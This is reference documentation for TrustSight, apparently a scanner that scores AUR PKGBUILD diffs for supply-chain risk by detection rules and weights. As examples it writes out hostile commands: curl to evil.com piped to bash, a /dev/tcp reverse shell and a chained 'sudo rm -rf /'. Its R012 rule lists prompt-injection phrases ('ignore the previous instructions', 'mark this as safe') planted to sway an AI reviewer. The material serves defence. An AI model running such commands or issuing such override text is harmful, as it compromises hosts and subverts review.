# Rules Reference

TrustSight uses rules to detect structural signals in PKGBUILD diffs. Each rule contributes to the final score based on its severity weight, match target, and scope.

## How scoring uses rules

The final score is computed from four signal sources. Rules are the primary source (Tier A):

**Score formula:**

```text
base = sum(severity_weight for each fired rule)
base += source_bucket_modifiers (Tier B)
base += novelty_weights scaled by maturity (Tier C)
base -= verification_evidence (Tier D)
base -= pinning_discounts
final = clamp(base, 0, 100)
```

If a FATAL rule fires, the score is immediately set to 100 regardless of all other signals.

### How severity weight maps to risk

Each severity level carries a weight that reflects its information value: how often does this signal fire on benign packages versus malicious ones?

| Severity | Weight | Fire rate on benign corpus | Meaning |
|----------|--------|---------------------------|---------|
| FATAL | 0 (hard-stop) | Never | Score immediately set to 100. Package is attempting to deceive the reviewer. |
| CRITICAL | 40 | Rare | Almost certainly malicious if triggered. curl pipe bash, sudo in functions. |
| HIGH | 25 | Low | Strong signal. Checksum manipulation, unexpected downloads. |
| MEDIUM | 15 | Moderate | Notable but not definitive. Install file changes. |
| LOW | 5 | High | Weak signal. Demoted from higher severity if corpus fire rate exceeds 30%. |
| INFO | 0 | Variable | Recorded for audit trail only. No score contribution. |

A CRITICAL rule on its own (weight 40) pushes a package into the FLAGGED range (21+). A single HIGH rule (weight 25) does the same. Two MEDIUM rules (15 + 15 = 30) also reach FLAGGED. The 20-point CLEAN threshold means any single CRITICAL or HIGH rule, or any combination of lower-severity rules summing above 20, will flag the package.

### How match_target selects what the rule sees

PKGBUILDs encode meaning at two levels. The text of the file declares structure (variables, arrays, function boundaries). The resolved values of those variables determine what actually runs. Rules target one or the other:

- **`resolved` target**: the rule pattern is applied to the post-variable-expansion value of each function body and source array. This catches patterns hidden behind variables: `curl $url | $shell` in the diff becomes `curl https://evil.com/hook.sh | bash` after resolution.
- **`raw_line` target**: the rule pattern is applied to the literal diff line with the `+`/`-` prefix stripped. This catches patterns in the PKGBUILD structure itself: a `sha256sums=('SKIP')` declaration or a unicode bidi override character.

Some patterns are only visible at the raw level (structure, declarations, unicode characters). Some are only meaningful after resolution (actual URLs, command strings). The two-target design covers both surfaces.

Both targets see *logical* lines, not physical ones. A shell continuation is joined before matching, so a command split across a trailing backslash is still matched as a whole:

```bash
curl \
  https://evil.example/x.sh | bash
```

Rules match one line at a time, so without this the pipe-to-shell patterns would see only `curl \`. Only lines carrying the same diff marker are joined, so an addition is never spliced onto a removal.

### How scope reduces false positives

Scope restricts which lines a `raw_line` rule checks. Without scope, a rule like R009 (`sudo`) would fire on every line containing the word `sudo`, including comments (`# sudo is required`), messages (`echo "sudo needed"`), and top-level declarations (`groups=('sudo')`). The `function_body` scope restricts matching to lines inside `build()`, `package()`, `check()`, and similar functions where commands actually execute.

Scope is set per-rule in `rules.toml`. When absent, the rule matches all lines. Scope has no effect on `resolved`-target rules because resolution already strips comments and top-level declarations.

The `message` context applies only when a line is *nothing but* a message. A shell line does not end at its first command, so `echo "x"; sudo rm -rf /` is an execution context, not a message, and `echo "$(curl evil | bash)"` runs a command substitution inside the quotes. Any command separator (`;`, `&`, `|`) or substitution (`$(`, backtick) after the message keyword disqualifies the line, which is what stops a short prefix from switching a scoped rule off.

A scope entry may also name the enclosing function rather than a generic context. This distinguishes cases that `function_body` alone cannot: `curl` inside `build()` is routine, while `curl` inside `pkgver()` reaches the network during version resolution, before any review step. R051 uses `scope = ["pkgver"]` for exactly this.

Note that a *bare* function header (`build() {`) is classified as `other`, not `function_body`: the context applies to the lines *inside* the braces. A header that also carries code, though, is `function_body`, because that code really does run there: `build() { curl evil | bash; }` is matched by `function_body`-scoped rules, and the context does not leak to the lines that follow.

A pattern that matches the header while scoping itself to `function_body` therefore misses the ordinary multi-line form and only fires on single-line definitions; `trustsight lint-rules` reports this as `scope-contradiction`.

### How rules map to evidence tiers

| Tier | Rule sources | What they measure |
|------|-------------|-------------------|
| A (Structural) | R001 to R013, R039 to R082, C001 to C007, D001 to D004 | Direct pattern matching against PKGBUILD commands and structure |
| B (Priors/Context) | Source bucket classification | Domain reputation of new URLs (not a rule, but a scoring input) |
| C (History/Novelty) | URL and maintainer novelty | First-seen signals from the local database |
| D (Verification) | Checksum, PGP, GPG presence | Cryptographic integrity metadata (subtractive) |

Rules only contribute to Tier A. Tiers B, C, and D are computed independently and added to the score alongside the rule contributions.

---

## R-series (TOML-configurable detection rules) {#r-series}

Defined in `~/.config/trustsight/rules.toml`. Loaded at runtime via `load_rules()` in `src/trustsight/rules.py`.

Each rule supports these fields:

| Field | Type | Description |
|-------|------|-------------|
| `id` | `string` | Rule identifier (`R001`-`R013` core, `R039`+ expanded, `R060`+ code-emitted). |
| `name` | `string` | Human-readable name. |
| `pattern` | `string` | Python regex applied to the match target. |
| `severity` | `string` | `FATAL`, `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, or `INFO`. |
| `category` | `string` | Semantic category (`network_execution`, `obfuscation`, `installer`, `privilege`, `network_usage`, `injection`, `unicode`, `integrity`). |
| `match_target` | `string` | `"resolved"` : apply to variable-resolved command strings after tokenization. `"raw_line"` : apply to raw diff lines after stripping the `+`/`-` prefix. |
| `scope` | `list[string]` | (Optional, `raw_line` only) Restrict matching to line contexts (`["function_body"]`, `["message"]`, `["other"]`) or to a named PKGBUILD function (`["pkgver"]`, `["package"]`, `["package_foo"]`). When absent, matches all lines. |
| `added_only` | `bool` | (Optional, `raw_line` only) Match only added (`+`) lines. Raw diff lines include removals, so without this a maintainer *deleting* a suspicious line raises the score. All `R039`+ rules set it. |
| `experimental` | `bool` | (Optional) Skip the rule unless `[rules] experimental = true` in `config.toml`. Used for rules whose false-positive rate has not been measured against the benign corpus. |
| `include_comments` | `bool` | (Optional) Also match comment lines, which are filtered out for every other rule. Only for rules whose target is the *reader* rather than the shell (R012, R013): a commented-out command does not run, but a comment is exactly where an injection or a hidden character lives. |

### R001: Remote Script Execution {#r001}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `curl.*\|\s*(?:/bin/)?(?:bash|sh|python|zsh|dash|busybox\s+sh|source\s+/dev/stdin)`
- **Description:** Detects `curl | bash`, `curl | sh`, and variants including `python`, `zsh`, `dash`, `busybox sh`, and `source /dev/stdin`. This is the most common careless malice pattern in AUR PKGBUILDs: downloading a script and piping it directly to a shell without verification.

### R002: Wget Pipe to Shell {#r002}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `wget.*\|\s*(?:/bin/)?(?:bash|sh|python|zsh|dash|busybox\s+sh|source\s+/dev/stdin)`
- **Description:** Same as R001 but for `wget`. Separate rule per tool to allow per-tool tuning.

### R003: Base64 Decode and Execute {#r003}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `obfuscation`
- **Pattern:** `base64.*(?:\-d|\-\-decode).*\|`
- **Description:** Detects `base64 -d |` and `base64 --decode |` piped to execution. Base64-encoded scripts are a common obfuscation technique to hide malicious commands from casual review.

### R004: Checksum Disabled {#r004}

- **Target:** programmatic (not TOML-configurable)
- **Severity:** HIGH (weight 25), downgraded to INFO (weight 0) if justified
- **Category:** `integrity`
- **Condition:** Fires when `sha256sums=SKIP` appears in the diff.
- **Justification:** Severity is downgraded to INFO if the diff contains a VCS source (`git+https://`, `.git`), a signature file (`.sig`, `.asc`), `validpgpkeys` declaration, or DKMS reference. Justification checked via `is_skip_justified()` in `src/trustsight/differ.py`.
- **Note:** Hard-coded in `src/trustsight/analysis/structural.py`. Cannot be disabled through `rules.toml` because checksum integrity is foundational to the scoring model.

### R005: Checksum Emptied {#r005}

- **Target:** programmatic (not TOML-configurable)
- **Severity:** HIGH (weight 25)
- **Category:** `integrity`
- **Condition:** Fires when `sha256sums=()` appears in the diff (array set to empty).
- **Note:** Hard-coded in `src/trustsight/analysis/structural.py`. Cannot be disabled through `rules.toml`.

### R006: Insecure Download Protocol {#r006}

- **Target:** `resolved`
- **Severity:** MEDIUM (weight 15)
- **Category:** `network_execution`
- **Pattern:** `https?://.*\.tar\.gz.*\|`
- **Description:** Detects `tar.gz` piped to execution (e.g. `curl ... tar.gz | tar -x`). Originally classified as HIGH/25 and later reduced. This entry previously documented it as LOW/5 on the grounds of a fire rate above 30%, but the shipped rule is MEDIUM and it fires on **0.00%** of the 3,246-diff benign corpus; the pattern requires a pipe on the same resolved line, which is rarer than the earlier note assumed.

### R007: Install File Modification {#r007}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `installer`
- **Pattern:** `\+.*\.install.*`
- **Scope:** All lines (no function-body restriction)
- **Description:** Fires when a `.install` file is added or modified in the diff. Install scripts run with root privileges and are a common vector for persistent backdoors.

### R008: Unexpected File Download {#r008}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network_execution`
- **Pattern:** `\b(python|ruby|perl)\s+-c\s+https?://`
- **Description:** Detects language runtimes downloading scripts from URLs: `python -c <url>`, `ruby -c <url>`, `perl -c <url>`. An unusual pattern that indicates a runtime fetching and executing code from a remote server.

### R009: Privilege Escalation {#r009}

- **Target:** `raw_line`
- **Severity:** CRITICAL (weight 40)
- **Category:** `privilege`
- **Pattern:** `\bsudo\b`
- **Scope:** `["function_body"]` only
- **Description:** Detects `sudo` inside function bodies. Does not fire in comments, plain messages (`echo`, `printf`, `note`), or top-level declarations. Scope restriction prevents false positives from `groups=('sudo')` or `echo "sudo required"`. It *does* fire on `echo "x"; sudo ...`, since a message followed by a separator is an execution context.

### R010: Uses curl in PKGBUILD {#r010}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network_usage`
- **Pattern:** `\bcurl\s`
- **Scope:** `["function_body"]` only
- **Description:** Detects `curl` commands inside function bodies. Does not fire in comments or messages. Low severity because curl is a legitimate build tool; the presence alone is not suspicious, but combined with other signals it adds context.

### R011: Uses wget in PKGBUILD {#r011}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network_usage`
- **Pattern:** `\bwget\s`
- **Scope:** `["function_body"]` only
- **Description:** Same rationale as R010 but for `wget`. Separate rule per tool.

### R012: Prompt Injection Detection {#r012}

- **Target:** `resolved`
- **Severity:** FATAL (hard-stop at 100, weight 0)
- **Category:** `injection`
- **Pattern:** `` \b(?:ignore|disregard|forget|override|bypass)\s+(?:all\s+|any\s+|the\s+)*(?:previous|above|prior|earlier|preceding|foregoing|existing)\s+(?:\w+\s+){0,2}(?:instructions?|commands?|input|context|rules?|prompts?|guidelines?|checks?)|^[^\S\n]*(?:#[^\S\n]*)?(?:system|assistant)[^\S\n]*:[^\S\n]*\S|</?(?:system|instructions?|admin|prompt|assistant)\s*>|\byou\s+are\s+(?:an?|the)\s+[^.\n]{0,48}?(?:model|assistant|ai\b)|\bnew\s+instructions?\s*:|\bdo(?:\s+not|n['’]t)\s+(?:flag|warn|analy[sz]e|review|scan)\b|\bdo(?:\s+not|n['’]t)\s+report\s+(?:any\s+|the\s+)?(?:security|issues?|concerns?|problems?|findings?|warnings?|anything)\b|\b(?:mark|classify|report|treat|label|approve)\b[^.\n]{0,24}?\bas\s+(?:safe|benign|clean|harmless|trusted|ok)\b|\b(?:claude|chatgpt|gpt-?[0-9]?|copilot|gemini|llm|ai\s+assistant)\b[^.\n]{0,60}?\b(?:ignore|approve|skip|overlook|flag)\b ``
- **Comments:** scanned (`include_comments`)
- **Description:** Detects text addressed to whoever *reads* the PKGBUILD rather than to the shell that runs it: instruction overrides ("ignore the previous instructions"), role markers (`system:`, `assistant:`), tag-like injections (`<system>`, `<instructions>`), personas ("you are a helpful model..."), suppression orders ("do not flag/warn/analyze") and pre-declared verdicts ("mark this as safe"). Comment lines are scanned, unlike every rule that describes what the shell executes, because the payload is always a comment. Calibrated at 22/22 injection fixtures with 0 fires across the 3,246-diff benign corpus. This is still a **tripwire rule**: when it fires the package is almost certainly malicious; when it does not, nothing can be concluded. Score hard-stops at 100 regardless of other signals.

### R013: Unicode Bidi Override {#r013}

- **Target:** `raw_line`
- **Severity:** FATAL (hard-stop at 100, weight 0)
- **Category:** `unicode`
- **Pattern:** `[\u202A-\u202E\u2066-\u2069\u2060-\u2064\U000E0000-\U000E007F]|(?<![^\x00-\x7F])[\u200B-\u200F\uFEFF](?![^\x00-\x7F])`

The rule splits deceptive codepoints into two classes, because they are not equally suspicious.

**Fires unconditionally**: bidi overrides and isolates (U+202A-U+202E, U+2066-U+2069), invisible operators (U+2060-U+2064), and tag characters (U+E0000-U+E007F). None has a legitimate use in a build recipe. These are the characters that make displayed text differ from executed text.

**Fires only between ASCII neighbours**: zero-width and directional characters (U+200B-U+200F, U+FEFF). U+200B-U+200D are *mandatory* joiners in Malayalam, Lao, Devanagari and other scripts: a localized `GenericName[ml]=` line in a browser package legitimately contains U+200D. Because R013 is FATAL, firing on one scored an entirely benign package 100/100. Two packages in the benign corpus (`brave-origin-bin`, `zen-browser-bin`) did exactly this. Requiring ASCII on both sides preserves the attack (a joiner hidden inside an ASCII command or URL, such as `https://evil.com<U+200D>/pkg.tar.gz`) while dropping the false positive.

- **Note:** Score hard-stops at 100 regardless of other signals. The previous pattern omitted U+200E/U+200F, U+2060-U+2064 and the tag block, which is where the documented recall gap came from; `unicode.py` already listed them.

### Severity weights

Configured in `config.toml` `[severity_weights]`:

| Severity | Weight |
|----------|--------|
| FATAL | 0 (hard-stop score at 100) |
| CRITICAL | 40 |
| HIGH | 25 |
| MEDIUM | 15 |
| LOW | 5 |
| INFO | 0 |

### FATAL rules {#fatal-rules}

R012 and R013 are FATAL. They contribute **0 weight** to the running total but immediately set `final_score = 100` and risk level `"Critical"`. No other rules are evaluated for weight contribution after a FATAL fires; the short-circuit is in `calculate_score()` at `src/trustsight/scoring.py`.

---

## C-series (code, structural rules) {#c-series}

Generated by `_structural_findings()` in `src/trustsight/analysis/structural.py`. Not configurable via TOML. Fire based on structural comparisons between the diff and the post-diff state. Each one compares the *before* and *after* of the diff; a checksum that changed while the source stayed put, a URL swapped without a version bump; which a pattern matched against one line at a time cannot express. Comparisons use `_pkgver_changed_in_diff()` to detect `pkgver=` value changes.

`_structural_findings()` is shared by `analyze_package()` (live) and `scan_diff()` (offline replay), so the two pipelines cannot drift apart.

### C001: Checksum Changed Without Source Change With Stable Version {#c001}

- **Severity:** HIGH (weight 25)
- **Condition:** `sha256sums` value changed (added or modified), **no** source URLs were added or removed, **and** `pkgver` did not change.
- **Description:** A checksum changed with no corresponding version or source change is anomalous. It suggests the tarball content changed without an upstream version bump, which is a red flag for supply-chain compromise.

### C002: Checksum Updated With Version Bump {#c002}

- **Severity:** INFO (weight 0)
- **Condition:** `sha256sums` value changed (added or modified), **no** source URLs were added or removed, **and** `pkgver` did change.
- **Description:** Normal during routine version bumps. Recorded for audit trail; contributes no weight.

### C003: Source URL Changed Without Version Bump {#c003}

- **Severity:** INFO (weight 0)
- **Condition:** Source URLs were both added **and** removed (the sets differ) **and** `pkgver` did not change.
- **Description:** Source URLs swapped without a version bump is noteworthy but not necessarily malicious. Recorded for audit trail; contributes no weight.


### C004: Checksum Removed For Unchanged Source {#c004}

- **Severity:** CRITICAL (weight 40)
- **Condition:** A checksum array line is deleted, no replacement checksum line is added, **and** the source URL set is unchanged.
- **Description:** Distinct from R005 (`sha256sums=()` added, array emptied in place): here the declaration disappears from the file entirely, leaving makepkg with nothing to verify against a source that itself did not change. Detected by `detect_checksum_removed()` in `src/trustsight/differ.py`.

### C005: Binary Artifact From Untrusted Source {#c005}

- **Severity:** MEDIUM (weight 15)
- **Condition:** An added source URL points at an executable artifact (`.bin`, `.exe`, `.elf`, `.so`, `.dll`, `.dylib`, `.AppImage`, `.deb`, `.rpm`, `.apk`, `.msi`, `.jar`, `.run`) **and** its bucket is neither `trusted_forge` nor `official`.
- **Description:** A prebuilt binary cannot be reviewed from the PKGBUILD, so its provenance is the only available evidence. Restricted to untrusted buckets deliberately: `-bin` packages repackaging a GitHub release are a large fraction of the AUR and firing on all of them would make the rule pure noise.

### C006: Maintainer Change With New Source Domain {#c006}

- **Severity:** HIGH (weight 25)
- **Condition:** The maintainer changed **and** at least one added source URL is on a domain not present among the removed URLs.
- **Description:** Either signal alone is routine; maintainers change hands, domains migrate. Together they are the shape of an account takeover redirecting sources to attacker-controlled infrastructure. Requires maintainer metadata, so it fires only in the live path, not in offline corpus replay.

### C007: Command Substitution In Source Array {#c007}

- **Severity:** CRITICAL (weight 40)
- **Condition:** An added `source=()` line contains `$(...)` or a backtick expression.
- **Description:** The source array is data, evaluated when the PKGBUILD is parsed. A command substitution there executes *before* any build function runs, and before any rule that inspects `build()` has anything to look at.

---

## Expanded ruleset (R039+) {#expanded-ruleset}

These rules roughly double the pattern-based detection surface. They are **enabled by default**, having been calibrated against a 3246-diff stratified benign corpus: fourteen fire on zero benign diffs, and every remaining hit was inspected individually; all but one were true positives. Enabling them costs 0.5 percentage points of zero-rate and leaves p95 unchanged.

The `experimental` flag remains supported for future additions. A rule carrying `experimental = true` is skipped unless `config.toml` sets:

```toml
[rules]
experimental = true
```

Numbering starts at R039 because `R014`-`R026` are already referenced by `tests/fixtures/baseline.json` and the malicious fixture generators; reusing those identifiers would silently change what they mean in existing baselines.

Every `raw_line` rule below sets `added_only = true`.

### R039: Eval With Dynamic Content {#r039}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Pattern:** `` \beval\s+(?:"|\$\(|\$\{|`|\$[a-zA-Z_]) ``
- **Description:** Detects `eval` applied to a variable, command substitution, or backtick expression. The payload is assembled at runtime, so no static pattern can see what will execute.

### R040: Shell -c With Dynamic Payload {#r040}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Pattern:** `` \b(?:bash|sh|zsh|dash)\s+-c\s+(?:\$\(|`|\$\{|"[^"]*\$) ``
- **Description:** Detects `sh -c` / `bash -c` whose argument contains a variable or substitution rather than a literal command.

### R041: Shell Network Redirection {#r041}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `/dev/(?:tcp|udp)/`
- **Description:** Bash's `/dev/tcp` and `/dev/udp` pseudo-devices open network sockets with no external binary. The canonical reverse shell is `bash -i >& /dev/tcp/host/port 0>&1`. Matching the bare path rather than a redirection operator covers the `>&` and `exec 3<>` forms alike.

### R042: Download Then Execute {#r042}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Pattern:** `(?:curl|wget)\s+[^;&|]*-o\s*\S+[^;&|]*(?:&&|;)\s*(?:chmod\s+\+x[^;&|]*(?:&&|;)\s*)?(?:\./|/tmp/|bash\s|sh\s)`
- **Description:** Detects the download-then-run chain: fetch to a path, optionally `chmod +x`, then execute it. Each step alone is unremarkable; the sequence is not.

### R043: Base64 Blob Decode {#r043}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `obfuscation`
- **Pattern:** `base64\s+(?:-d|--decode)\s*(?:<<<|<<\w*|\$\{?[a-zA-Z_])`
- **Description:** Detects `base64 -d` fed from a here-string or a variable, as opposed to decoding a file that is itself part of the source array.

### R044: Interpreter One-Liner With Network {#r044}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network_execution`
- **Pattern:** `\b(?:python3?|perl|ruby)\s+-e\s+.*(?:socket|urllib|urlopen|Net::|LWP|open-uri|https?://)`
- **Description:** Detects an interpreter one-liner (`-e`) that references network APIs (`socket`, `urllib`, `LWP`, `Net::`) or an inline URL.

### R045: Binary Encoding Pipe {#r045}

- **Target:** `resolved`
- **Severity:** MEDIUM (weight 15)
- **Category:** `obfuscation`
- **Pattern:** `\b(?:xxd|uudecode)\s+[^|]*\|`
- **Description:** Detects `xxd` or `uudecode` piped onward. Both reconstruct binary content from a text representation, a way to carry a payload past text review.

### R046: Source URL Uses IP Address {#r046}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `network`
- **Pattern:** `https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}`
- **Description:** A source URL pointing at a bare IP address bypasses DNS and any domain reputation the bucket classifier could apply.

### R047: Source URL Uses Non-Standard Port {#r047}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network`
- **Pattern:** `https?://[^/\s:]+:(?!(?:80|443|8080|8443)(?:[/\s"\x27]|$))\d{2,5}`
- **Description:** A source URL on a port other than 80, 443, 8080, or 8443. Unusual ports suggest a service that is not a conventional distribution host.

### R048: Source URL On Free Registrar TLD {#r048}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network`
- **Pattern:** `https?://[^/\s]*\.(?:tk|ml|ga|cf|gq|pw)(?:[:/]|["\x27\s)]|$)`
- **Description:** A source URL on a free-registrar TLD (`.tk`, `.ml`, `.ga`, `.cf`, `.gq`, `.pw`). These carry no registration cost and are disproportionately used for throwaway infrastructure. Deliberately excludes `.xyz` and `.top`, which have substantial legitimate use.

### R049: Compiler Plugin Or Loader Override {#r049}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `build`
- **Pattern:** `\b(?:CFLAGS|CXXFLAGS|LDFLAGS)\s*\+?=.*(?:-fplugin=|-Wl,--dynamic-linker=)`
- **Description:** `-fplugin=` loads an arbitrary shared object into the compiler; `-Wl,--dynamic-linker=` changes which loader the produced binary uses. Both alter the build without touching any source file.

### R050: Compiler Hardening Disabled {#r050}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `build`
- **Pattern:** `\b(?:CFLAGS|CXXFLAGS|LDFLAGS)\s*\+?=.*(?:-fno-stack-protector|-z\s*execstack)`
- **Description:** Detects removal of stack-protector or NX protections from the build flags.

### R051: Network Access In pkgver {#r051}

- **Target:** `raw_line`
- **Severity:** HIGH (weight 25)
- **Category:** `packaging`
- **Scope:** `['pkgver']`
- **Pattern:** `\b(?:curl|wget|git\s+(?:clone|fetch|pull|ls-remote)|svn\s+(?:co|checkout)|hg\s+pull)\b`
- **Description:** `pkgver()` runs during version resolution, before a reviewer sees the build. Network access there executes ahead of any inspection step. Scoped to `pkgver` so that `curl` in `build()` is unaffected, and matched against fetching subcommands only; `git describe`, the standard VCS idiom, is local and must not fire.

### R052: Dotfile Written To User Profile {#r052}

- **Target:** `raw_line`
- **Severity:** HIGH (weight 25)
- **Category:** `persistence`
- **Pattern:** `\b(?:install|cp|mv|tee)\s+[^;&|]*(?:\$HOME|~|/root|/home/[^/\s]+)/\.\w+`
- **Description:** Detects writes to a dotfile under `$HOME`, `~`, `/root`, or `/home/<user>`, the shape of shell-profile persistence. Dotfiles written inside `$pkgdir` (such as `/etc/skel` templates) are ordinary packaging and do not match.

### R053: Setuid Or Setgid Bit Set In Package Root {#r053}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `privilege`
- **Pattern:** `\bchmod\s+(?:-\S+\s+)*(?:[2467][0-7]{3}\b|[ugoa]*\+s\b)\s+(?!["\x27]?/)`
- **Description:** Setuid or setgid applied to a path being staged into the package. Detects both octal (`4755`, `2755`) and symbolic (`u+s`) forms; ordinary modes such as `644`, `755` and `+x` do not match. Chromium's sandbox helper legitimately requires `4755`, so this fires on essentially every Electron package. Measured across the benign corpus, MEDIUM changes **no** package's risk band; the evidence stays visible in the tiered breakdown without reclassifying routine updates. At HIGH it would have reclassified every Electron package as Medium.

### R059: Setuid Or Setgid Bit Set Outside Package Root {#r059}

- **Target:** `raw_line`
- **Severity:** HIGH (weight 25)
- **Category:** `privilege`
- **Pattern:** `\bchmod\s+(?:-\S+\s+)*(?:[2467][0-7]{3}\b|[ugoa]*\+s\b)\s+["\x27]?/`
- **Description:** The same operation against an absolute path. This touches the live filesystem rather than `$pkgdir`, so it is a privilege change on the build host and not packaging. Split from R053 because the two are materially different: `chmod u+s "$pkgdir/opt/x/chrome-sandbox"` is ordinary Electron packaging, while `chmod u+s "/usr/bin/helper"` is not.

### R054: Persistence Unit Outside Package Root {#r054}

- **Target:** `raw_line`
- **Severity:** HIGH (weight 25)
- **Category:** `persistence`
- **Pattern:** `[\s"\x27](?:/etc/(?:cron\.[a-z]+|cron\.d|systemd/system)|/usr/lib/systemd/system|/var/spool/cron)/`
- **Description:** Detects a cron job or systemd unit written to an absolute system path rather than into `$pkgdir`. Installing a unit *into* `$pkgdir` is correct packaging; writing to the live filesystem during a build is not.

### R055: Git Clone With Variable Branch {#r055}

- **Target:** `resolved`
- **Severity:** MEDIUM (weight 15)
- **Category:** `source`
- **Pattern:** `git\s+clone\s+[^;&|]*(?:--branch|-b)\s+\$\{?[a-zA-Z_]`
- **Description:** A `git clone --branch $var` resolves at build time to whatever the variable holds, so the pinned ref is not actually pinned.

### R056: Download Then Source {#r056}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Pattern:** `(?:curl|wget)\s+[^;&|]*-o\s*\S+[^;&|]*(?:&&|;)\s*(?:source|\.)\s`
- **Description:** Detects a download followed by `source` or `.`, which executes the fetched file in the current shell.

### R057: TLS Verification Disabled {#r057}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Pattern:** `(?:curl\s+(?:[^;&|]*\s)?(?:--insecure|-k)\b|wget\s+(?:[^;&|]*\s)?--no-check-certificate\b)`
- **Description:** Detects `curl --insecure` / `curl -k` and `wget --no-check-certificate`. Disabling certificate verification makes the transport trivially interceptable. The `-k` match requires a preceding word boundary so that flags such as `--keepalive-time` do not trigger it.

### R058: Write Outside Package Root {#r058}

- **Target:** `raw_line`
- **Severity:** HIGH (weight 25)
- **Category:** `system`
- **Pattern:** `^\+?\s*(?:sudo\s+)?(?:install|cp|mv|dd|tee)\s+[^;&|]*(?:(?<=\s)|(?<=\s["\x27]))(?:/etc|/boot|/usr/bin|/usr/lib)/`
- **Description:** Detects writes to `/etc`, `/boot`, `/usr/bin`, or `/usr/lib` by absolute path. The same write prefixed with `$pkgdir` is normal packaging and does not match.

---

### R060: Critical Build Function Modified {#r060}

- **Target:** programmatic (diff-aware, defined in `src/trustsight/analysis/build.py`)
- **Severity:** INFO (weight 0)
- **Category:** `build`
- **Description:** The diff changes any line inside `build()`, `prepare()`, `check()`, or `package()`. Many supply-chain attacks add a single line to one of these functions, so this reports that an executing function was altered.

**INFO, so it contributes nothing to the score.** It fires on 21.4 % of benign diffs because maintainers rewrite build functions routinely, and no narrowing reaches triage quality: restricting to an unchanged `pkgver` still leaves 11.6 %, and the "version bump that also rewrites `build()`" case the rule was first proposed for is 9.8 %. Carrying weight it would simply add points to one benign update in five.

At weight 0 it is context for a reviewer rather than a signal, which is why it is the one rule in this group that is **on by default**.

Function membership comes from `_classify_enclosing_function()` in `rules.py`, **not** from the `@@` hunk header. The calibration corpus is generated with `git diff -W` and a custom `xfuncname`, so its hunk headers name the enclosing function, while the live pygit2 path emits none. A rule tuned on hunk headers would be calibrated against data production never produces.

On by default since v0.7.0. See [`[experimental_rules]`](configuration.md#experimental_rules).

### R061: Hidden Network Fetch In Build {#r061}

- **Target:** programmatic (resolved command lines)
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Description:** A command inside `build()`, `prepare()`, `check()`, or `package()` downloads a URL that does not appear in `source=()`. This is the classic route around checksum verification: the declared sources verify cleanly while the real payload arrives at compile time.

The comparison is against a **source-array-scoped** URL extraction, not the general `extract_urls_from_diff()`. That helper collects URLs from any added line, including the offending `curl` line itself, so comparing against it would mean the rule could never fire. A fetch of a URL already declared in `source=()` does not fire.

On by default since v0.7.0. See [`[experimental_rules]`](configuration.md#experimental_rules).

---

## Measured fire rates {#experimental-fire-rates}

Measured against the 3246-diff benign corpus with a 209,909-name dependency corpus. All D-series, R061-R064, and R081-R082 rules are **on by default**. These are **false-positive rates**: every hit is a benign package.

The numbers are enforced, not just recorded. `scripts/calibration_gates.py` replays the corpus against the *shipped* configuration in a temporary directory with a cold database, and fails the build if any scoring rule exceeds a 0.30 fire rate, if benign p95 reaches the malicious p5, if a weight-0 annotation starts scoring, or if a labelled attack fixture stops being detected. It runs on every push. Class C and Class D rules are absent from this table because they cannot fire on a stateless diff at all, which is itself one of the gates.

For a complete reference including the core and expanded rules, see [Fire Rates](../explanation/fire-rates.md).

| Rule | Severity | Fires | Rate | Read |
|------|----------|-------|------|------|
| D004 | HIGH | 0 | 0.00 % | No false positive across the 2084 corpus diffs that declare `provides`/`replaces`. |
| R062 | HIGH | 3 | 0.09 % | All `mullvad-vpn-bin`, which sets a setuid bit and enables a unit from `post_install()`. Real privileged behaviour, which is the point. |
| R063 | HIGH | 0 | 0.00 % | Zero, because it asks where the patch comes from rather than whether it is declared. The broad "not in `source=()`" form measured 2.13 %. |
| R064 | MEDIUM | 1 | 0.03 % | `transset-df`, a genuine https to http downgrade. |
| R065 | INFO | - | - | Not calibrated: fires on any recent update, which is inherently time-of-run dependent. |
| R066 | INFO | - | - | Not calibrated: fires on packages < 30 days old, which is a small and shifting set. |
| R067 | MEDIUM | - | - | Not calibrated: fires when the user's last analysis is > 1 year old, which varies per database. |
| R068 | INFO | - | - | Not calibrated: zero-weight metadata; context only. |
| R069 | HIGH | 1 | 0.03 % | Near-zero; matches the predicted rate. |
| R070 | HIGH/MED | 8 | 0.25 % | All HIGH (LD_ vars). No MEDIUM fires in corpus. |
| R071 | HIGH | - | TBD | Not corpus-measurable; requires live git history. |
| R072 | INFO | 515 | 15.87 % | INFO weight 0; not a scoring impact. |
| R074 | HIGH | 2/179 pkgs | 1.12 % | Measured via package-name scan with seeded DB. Fires on `dosbox-x` and `electron36`. |
| R075 | MEDIUM | 11 | 0.34 % | Measured with seeded DB (209,909-name seed). Well under the 30% gate. |
